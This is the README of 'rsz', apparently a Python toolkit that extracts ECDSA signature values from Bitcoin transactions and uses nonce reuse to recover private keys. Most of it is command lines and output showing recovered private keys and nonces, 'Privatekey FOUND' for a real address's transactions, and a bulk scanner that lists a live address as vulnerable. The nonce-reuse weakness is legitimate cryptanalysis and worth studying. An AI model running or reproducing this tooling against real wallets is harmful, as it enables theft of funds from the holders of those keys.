# rsz
Retrieve ECDSA signature R,S,Z values from blockchain rawtx or txid.

## Info
The script parse the data of rawtx to fetch all the inputs in the transaction and reconstructs the unsigned message for each of them
 to find the Z value. The result is given as R,S,Z,Pubkey for each of the inputs present in the rawtx data. _**[No Internet required]**_  
 
 If txid is given, instead of rawtx then blockchain API is used to fetch the details of rawtx and then R,S,Z calculation starts. _**[Internet required]**_

## Requirements
The required library (3 files) can be obtained from the location https://github.com/iceland2k14/secp256k1

## Math
![image](https://github.com/iceland2k14/rsz/assets/75991805/b90164c8-a361-428b-b3d5-a6044782c59e)
![image](https://github.com/iceland2k14/rsz/assets/75991805/a3dd36ed-3eb4-4a7b-ae3e-44968e34631f)

## Usage: Python 3
```python getz_input.py```

## Run
```
usage: getz_input.py [-h] [-txid TXID] [-rawtx RAWTX]

This tool helps to get ECDSA Signature r,s,z values from Bitcoin rawtx or txid

optional arguments:
  -h, --help    show this help message and exit
  -txid TXID    txid of the transaction. Use Internet to fetch rawtx from
                given txid
  -rawtx RAWTX  Raw Transaction on the blockchain. No internet required

Enjoy the program! :) Tips BTC: bc1q39meky2mn5qjq704zz0nnkl0v7kj4uz6r529at
```

```
(base) C:\anaconda3\RSZ>python getz_input.py -txid 82e5e1689ee396c8416b94c86aed9f4fe793a0fa2fa729df4a8312a287bc2d5e

Starting Program...
======================================================================
[Input Index #: 0]
     R: 009bf436ce1f12979ff47b4671f16b06a71e74269005c19178384e9d267e50bbe9
     S: 00c7eabd8cf796a78d8a7032f99105cdcb1ae75cd8b518ed4efe14247fb00c9622
     Z: 9f4503ab6cae01b9fc124e40de9f3ec3cb7a794129aa3a5c2dfec3809f04c354
PubKey: 04e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6c
======================================================================
[Input Index #: 1]
     R: 0094b12a2dd0f59b3b4b84e6db0eb4ba4460696a4f3abf5cc6e241bbdb08163b45
     S: 07eaf632f320b5d9d58f1e8d186ccebabea93bad4a6a282a3c472393fe756bfb
     Z: 94bbf25ba5b93ba78ee017eff80c986ee4e87804bee5770fae5b486f05608d95
PubKey: 04e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6c
```

```
(base) C:\anaconda3\RSZ>python getz_input.py -rawtx 01000000028370ef64eb83519fd14f9d74826059b4ce00eae33b5473629486076c5b3bf215000000008c4930460221009bf436ce1f12979ff47b4671f16b06a71e74269005c19178384e9d267e50bbe9022100c7eabd8cf796a78d8a7032f99105cdcb1ae75cd8b518ed4efe14247fb00c9622014104e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6cffffffffb0385cd9a933545628469aa1b7c151b85cc4a087760a300e855af079eacd25c5000000008b48304502210094b12a2dd0f59b3b4b84e6db0eb4ba4460696a4f3abf5cc6e241bbdb08163b45022007eaf632f320b5d9d58f1e8d186ccebabea93bad4a6a282a3c472393fe756bfb014104e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6cffffffff01404b4c00000000001976a91402d8103ac969fe0b92ba04ca8007e729684031b088ac00000000

Starting Program...
======================================================================
[Input Index #: 0]
     R: 009bf436ce1f12979ff47b4671f16b06a71e74269005c19178384e9d267e50bbe9
     S: 00c7eabd8cf796a78d8a7032f99105cdcb1ae75cd8b518ed4efe14247fb00c9622
     Z: 9f4503ab6cae01b9fc124e40de9f3ec3cb7a794129aa3a5c2dfec3809f04c354
PubKey: 04e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6c
======================================================================
[Input Index #: 1]
     R: 0094b12a2dd0f59b3b4b84e6db0eb4ba4460696a4f3abf5cc6e241bbdb08163b45
     S: 07eaf632f320b5d9d58f1e8d186ccebabea93bad4a6a282a3c472393fe756bfb
     Z: 94bbf25ba5b93ba78ee017eff80c986ee4e87804bee5770fae5b486f05608d95
PubKey: 04e3896e6cabfa05a332368443877d826efc7ace23019bd5c2bc7497f3711f009e873b1fcc03222f118a6ff696efa9ec9bb3678447aae159491c75468dcc245a6c

```

```
vpk@DESKTOP-F18Q01U:~/vpk/rsz$ python3 rsz_solve.py
========================================================================
  (Demo) True Privatekey (random, not the recovered one) =  0x45ed73f15bbeceac981f68ea2f090082e3504248ffce8532e38aa22b6ee02735
========================================================================
 (input) r1: 0x538d2959108c11f0a34dd65c084af69765c66988b04e09eb0eebb7be69dde951
s1: 0x1bbcbd5d556d056c822a1ccb080d66d8144b4cb49a3bbf5c8e24a822248edf32
z1: 0x88b7c6434489c4576f32791cbac76c5e79116bc8c20d29b537e7c344faa79c14
========================================================================
 (input) r2: 0x538d2959108c11f0a34dd65c084af69765c66988b04e09eb0eebb7be69dde951
s2: 0x551bf9a08a7dd489fe003c29fc71eb682d86d189c599e291d019a1ba47fb71e7
z2: 0xc5e3d370b8d17338fb741e0dee637909f6b6186d8f32235ea73b77ba0974736a
========================================================================
  Starting to solve rsz using difference of k between 2 Tx (assuming same nonce)
  Extracted Privatekey (x) = 0x814971ff2b72e938008848bdfb2a7ead9944d0fc7f32d047467afe20660e2554
  Extracted Nonce (k) = 0xea7fe796359f86ab8c52295f0b1995a95a14a1adcf4d13009d0371b2da8c8048
====   Nonce Found using 2 rsz diff   = 0xea7fe796359f86ab8c52295f0b1995a95a14a1adcf4d13009d0371b2da8c8048
========================================================================

```

```
vpk@DESKTOP-F18Q01U:~/vpk/rsz$ python3 rsz_tnx_solve.py

=== ECDSA Nonce Reuse Auto Scanner (modified) ===

Enter number of txid: 2
Txid 1: 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7
Txid 2: fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6

=== Analyzing group r=0x538d2959108c11f0a34dd65c084af69765c66988b04e09eb0eebb7be69dde951 ===
[Info] Multiple distinct public keys share this r value.

Enter private key (hex or decimal) for txid 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7 (pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf)
to derive private key for txid fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6 (pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21),
or press Enter to skip:   “Enter the private key of transaction ID 1, which is computed with the same r value and corresponds to the same                             public key RSZ.” like 0x.....


```
```


vpk@DESKTOP-F18Q01U:~/vpk/rsz$ python3 rsz_tnx_solve.py

=== ECDSA Nonce Reuse Auto Scanner (modified) ===

Enter number of txid: 2
Txid 1: 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7
Txid 2: fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6

=== Analyzing group r=0x538d2959108c11f0a34dd65c084af69765c66988b04e09eb0eebb7be69dde951 ===
[Info] Multiple distinct public keys share this r value.

Enter private key (hex or decimal) for txid 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7 (pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf)
to derive private key for txid fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6 (pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21),
or press Enter to skip: 0x814971ff2b72e938008848bdfb2a7ead9944d0fc7f32d047467afe20660e2554
-------------------------
[Interactive Option2] Using provided d1 for pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf to attempt pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
k candidate = 0xea7fe796359f86ab8c52295f0b1995a95a14a1adcf4d13009d0371b2da8c8048
d2 candidate = 0xe301f356613c6ce71dd07784c7605ea19832c8f04e6b8e6b83cf71b2a27ffee6
derived pub = 03370e28039bf3d8307c735744f2854a405ad516883e99f8477fe8a7dc96d29e30
Derived public key does not match target pubkey. Candidate saved to output for inspection.
-------------------------
[Interactive Option2] Using provided d1 for pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf to attempt pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
k candidate = 0x15801869ca60795473add6a0f4e66a55609a3b38dffb8d3b22ceecd9f5a9c0f9
d2 candidate = 0x508042ff51c1752f580c82421046cc3a88119894d275e77c0ea2244cd12996c8
derived pub = 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
=> MATCH FOUND!

Done. Matches saved in matches.txt 

```
```


#"AND IF YOU HAVE NOT YET COMPUTED THE PRIVATE KEY, JUST ADD ALL THREE TRANSACTION IDS,
 WHICH ALL USE THE SAME R VALUE, BUT WITH TWO HAVING THE SAME PUBLIC KEY
 AND ONE BEING DIFFERENT."

```
```

vpk@DESKTOP-F18Q01U:~/vpk/rsz$ python3 rsz_tnx_solve.py

=== ECDSA Nonce Reuse Auto Scanner (modified) ===

Enter number of txid: 3
Txid 1: 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7
Txid 2: e1c9b009cfa861501ae6f3379148fcc5c0de98c5774a6c576fb9f9e6eb2879eb
Txid 3: fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6

=== Analyzing group r=0x538d2959108c11f0a34dd65c084af69765c66988b04e09eb0eebb7be69dde951 ===
[Option1] Recovered from pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf -> k=0xea7fe796359f86ab8c52295f0b1995a95a14a1adcf4d13009d0371b2da8c8048, d=0x814971ff2b72e938008848bdfb2a7ead9944d0fc7f32d047467afe20660e2554, address=1BTrViTDXhWrdw5ErBWSyP5LdzYmeuDTr2
[Info] Multiple distinct public keys share this r value.
-------------------------
[Option2] Using d1 from pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf to attempt pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
k candidate = 0xea7fe796359f86ab8c52295f0b1995a95a14a1adcf4d13009d0371b2da8c8048
d2 candidate = 0xe301f356613c6ce71dd07784c7605ea19832c8f04e6b8e6b83cf71b2a27ffee6
derived pub = 03370e28039bf3d8307c735744f2854a405ad516883e99f8477fe8a7dc96d29e30
-------------------------
[Option2] Using d1 from pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf to attempt pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
k candidate = 0x15801869ca60795473add6a0f4e66a55609a3b38dffb8d3b22ceecd9f5a9c0f9
d2 candidate = 0x508042ff51c1752f580c82421046cc3a88119894d275e77c0ea2244cd12996c8
derived pub = 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21
=> MATCH FOUND!

Enter private key (hex or decimal) for txid 34535e979bf3e0b960d7e3be85713fa6561a4d9642c7199a7bdf93b721b529a7 (pub 03c88e78a3f105d99b7b0643f3cfca56bad5ffd2c8e1bc055d8c6d51475bc6b2cf)
to derive private key for txid fc9c8c56ce09b48f1e593a0df3f9a03f8dc33ba2027621e047fc5fc4f86f93f6 (pub 02417f85cce4b89b6cce102bc365f292fe1c7b4ec65fe64ff225cb020ed6b3fa21),
or press Enter to skip:



```
```

(base) C:\anaconda3\RSZ>python rsz_rdiff_scan.py -a 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm

Starting Program...
------------------------------------------------------------------------------------------------------------------------
Total: 50 Input/Output Transactions in the Address: 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm
UnSupported Tx Input. Presence of Witness Data
Skipped the Tx [d52c7663adf9702529553e8eeb18f7f2bedad1e4ef23a7f9a187660d7dcb3522]........
UnSupported Tx Input. Presence of Witness Data
Skipped the Tx [d52c7663adf9702529553e8eeb18f7f2bedad1e4ef23a7f9a187660d7dcb3522]........
======================================================================
[Input Index #: 0] [txid: 3b7a0a5f4c55718f6374fd718d65e2b4a8fde8fd1158b4f9f659872899530939]
     R: 384327a0bdd1aeb3c33c4a49d7ab617657e24e979085b672017f25f9761722fd
     S: 6e2685a20bc95af56a8aa6035a7e29f1cedbb8cd56403011e9281687ed32ee58
     Z: 938a0a4d20b7e40bbd587f752f85dd1ed7f84b790965ca0407b5367d33f17f6b
PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
======================================================================
[Input Index #: 0] [txid: d3d0e560d414c86d88ea645a9dbee583d21a95ae2e57f10679b043ef33a0d23c]
     R: 4e1e91433ad7b1f6e52466f4d233c94b7023937f6345ab1179a2b268a22d52cc
     S: 270941b896645a8ecd98253dae59c580766ec10391d5742f830874dbabc4acbe
     Z: 74419baf355e3e14c1e44b9bcd8e7a7a2cdd1488c72fbfd3ab30523a448dd70d
PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
======================================================================
[Input Index #: 0] [txid: 3e9cd088d9f5462709b0e407c3e938518b348feaad879bc24fb88ff9b0ade941]
     R: 755f50abc717f8a5c7bf41d4ae2f6c702afcb3dccf127ae02dbcf5c64c55f3ea
     S: 45e92613115448bd6710c313ff2c6af2924dafee49d7a57915003ee218f5b73a
     Z: ee540220c3570af1cf96f9d9660b3e1dc593cae60e68a284363badce26830d64
PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
======================================================================
.....
.....
.....
.....
========  RSZ to PubKey Validation [SUCCESS]  ========
========  RSZ to PubKey Validation [SUCCESS]  ========
========  RSZ to PubKey Validation [SUCCESS]  ========
========  RSZ to PubKey Validation [SUCCESS]  ========
========  RSZ to PubKey Validation [SUCCESS]  ========
========  RSZ to PubKey Validation [SUCCESS]  ========
.....
.....
Duplicate R Found. Congrats!. (87, 95, '0400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
.....
.....
======================================================================
------------------------------------------------------------------------------------------------------------------------
[i=103] [j=105] [R Diff = fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141]
Privatekey FOUND: 0xc477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
======================================================================
------------------------------------------------------------------------------------------------------------------------

```

```

PS C:\Users\vedpr\Desktop\Bitcoin-Vulnerability-Scanner> python .\rsz_add_adv.py
Enter path to BTC addresses file (one per line): add.txt
Max transactions per address (0 = no limit): 0

CRYPTOGRAPHYTUBE Bitcoin Vulnerability Scanner (SAFE MODE, TXT only)
Scan Time: 2025-08-28 11:08:45
================================================================================
Total Addresses: 1441
Scanned Addresses: 13
Vulnerable Addresses: 1 (7.7%)

Vulnerabilities Found (counts):
🔴 Reused Nonce: 1
🔴 Weak RNG: 0
🔴 Multi-Nonce Delta: 0
🔴 K-Value Signals: 0
================================================================================

Currently Scanning: 18mxNASevBy3YpKSCRwoQ3ScsxzxohPXwr

Recent Vulnerable Addresses:
 - 152ermHcpemLTqdd5rvafJmEQDa6oiRr1B
================================================================================

Exiting gracefully...

```
```

Program Finished ...
```






